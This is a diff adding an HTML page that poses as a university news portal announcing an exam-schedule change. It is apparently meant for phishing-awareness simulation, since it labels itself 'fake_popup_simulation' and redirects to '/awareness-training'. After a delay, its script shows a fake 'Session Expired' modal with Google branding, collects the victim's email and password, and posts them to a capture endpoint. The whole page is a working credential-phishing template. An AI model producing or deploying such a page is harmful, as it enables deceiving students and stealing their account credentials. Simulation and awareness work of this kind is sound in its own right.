@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>University News Portal</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        #fakeModalOverlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(4px);
+            z-index: 99999;
+            align-items: center;
+            justify-content: center;
+        }
+        .fake-modal {
+            background: #fff;
+            padding: 30px;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            text-align: center;
+            animation: popIn 0.3s ease-out forwards;
+        }
+        @keyframes popIn {
+            0% { transform: scale(0.8); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body style="background: #f4f6f9;">
+
+    <nav class="navbar navbar-dark bg-primary">
+        <div class="container">
+            <a class="navbar-brand" href="#">🎓 University Student Portal</a>
+        </div>
+    </nav>
+
+    <div class="container mt-5">
+        <div class="row">
+            <div class="col-md-8">
+                <h2>Important Update Regarding Final Exams</h2>
+                <p class="text-muted">Published on: June 15, 2026</p>
+                <hr>
+                <p>Dear students, please be informed that the final examination schedule has been updated. You must log in to the portal to view your specific room allocations and timings.</p>
+                <p>Failure to attend the scheduled exams will result in an incomplete grade. Make sure to check the system immediately.</p>
+                <p><strong>Loading official document... please wait.</strong></p>
+                <div class="spinner-border text-primary mt-3" role="status"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="fakeModalOverlay">
+        <div class="fake-modal">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png" width="50" class="mb-3">
+            <h4 class="mb-2">Session Expired</h4>
+            <p class="text-muted" style="font-size: 14px;">Your session has timed out due to inactivity. Please verify your identity to continue reading.</p>
+            
+            <form id="popupForm">
+                <input type="email" id="popEmail" name="email" class="form-control mb-3" placeholder="University Email" required>
+                <input type="password" id="popPass" name="password" class="form-control mb-3" placeholder="Password" required>
+                <button type="submit" class="btn btn-primary w-100 fw-bold">Sign In</button>
+            </form>
+            <p class="mt-3 mb-0 text-muted" style="font-size: 12px;">Secured by Single Sign-On (SSO)</p>
+        </div>
+    </div>
+
+    <script>
+        setTimeout(() => {
+            document.getElementById('fakeModalOverlay').style.display = 'flex';
+        }, 4000);
+
+        document.getElementById('popupForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const payload = {
+                site: 'fake_popup_simulation',
+                form_data: {
+                    email: document.getElementById('popEmail').value,
+                    password: document.getElementById('popPass').value
+                }
+            };
+
+            fetch('/api/social-capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .finally(() => {
+                window.location.href = '/awareness-training';
+            });
+        });
+    </script>
+</body>
+</html>
